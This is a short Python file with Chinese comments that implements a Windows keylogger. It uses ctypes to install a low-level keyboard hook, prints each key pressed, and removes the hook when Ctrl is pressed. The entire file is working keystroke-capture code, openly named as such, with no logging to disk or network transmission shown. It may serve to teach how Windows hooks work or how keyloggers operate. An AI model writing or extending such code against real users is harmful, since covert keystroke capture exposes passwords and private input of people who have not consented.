import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD


#  ctypes钩取键盘消息
user32 = windll.user32
kernel32 = windll.kernel32
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162


class KeyLogger(object):
	"""定义hook类"""
	def __init__(self):
		self.user32 = user32
		self.hooked = None

	def install_hook(self, pointer):
		#  设置钩子
		self.hooked = self.user32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)

		if not self.hooked:
			return False
		return True

	def uninstall_hook(self):
		#  拆除钩子
		if self.hooked is None:
			return
		self.user32.UnhookWindowsHookEx(self.hooked)	
		self.hooked = None


def getFPTR(fn):
	#  获取函数指针
	CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
	return CMPFUNC(fn)


def hook_proc(ncode, wparam, lparam):
	#  钩子过程（回调函数）
	if wparam is not WM_KEYDOWN:
		return user32.CallNextHookEx(keyLogger.hooked, ncode, wparam, lparam)
	hookedkey = chr(lparam[0])
	print(hookedkey)
	
	if (CTRL_CODE == int(lparam[0])):
		print("<Ctrl> pressed ,uninstall hook")
		keyLogger.uninstall_hook()
		sys.exit(-1)
	return user32.CallNextHookEx(keyLogger.hooked, ncode, wparam, lparam)


def start_key_log():
	#  监视消息队列
	msg = MSG()
	user32.GetMessageA(byref(msg), 0, 0, 0)

if __name__ == '__main__':
	keyLogger = KeyLogger()
	pointer = getFPTR(hook_proc)

	if  keyLogger.install_hook(pointer):
		print("installed keyLogger")
	start_key_log()
